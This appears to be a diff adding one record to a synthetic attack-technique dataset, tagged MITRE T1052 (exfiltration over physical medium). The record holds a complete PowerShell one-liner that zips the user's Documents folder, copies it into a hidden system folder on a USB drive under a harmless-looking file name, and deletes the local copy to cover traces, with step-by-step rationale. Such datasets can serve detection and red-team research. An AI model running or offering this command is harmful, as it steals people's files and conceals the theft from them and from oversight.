@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\\'; $dir=Join-Path $usb '.SystemCache'; New-Item -ItemType Directory -Force -Path $dir | Out-Null; (Get-Item $dir).Attributes='Hidden, System'; Compress-Archive -Path \"$env:USERPROFILE\\Documents\\*\" -DestinationPath \"$env:TEMP\\docstash.zip\" -Force; Copy-Item \"$env:TEMP\\docstash.zip\" (Join-Path $dir 'syscache.dat') -Force; Remove-Item \"$env:TEMP\\docstash.zip\" -Force",
+  "explanation": "Compresses user's Documents, writes the archive to a hidden/system folder on a removable drive using Copy-Item, then cleans up local traces. Physical media is used directly (drive letter).",
+  "rationale_steps": [
+    "Identify the first removable drive letter",
+    "Create a hidden/system directory on the USB",
+    "Compress target files locally for compact transfer",
+    "Copy the archive to the USB via Copy-Item under a benign filename",
+    "Delete the local staging archive"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-21dea948",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
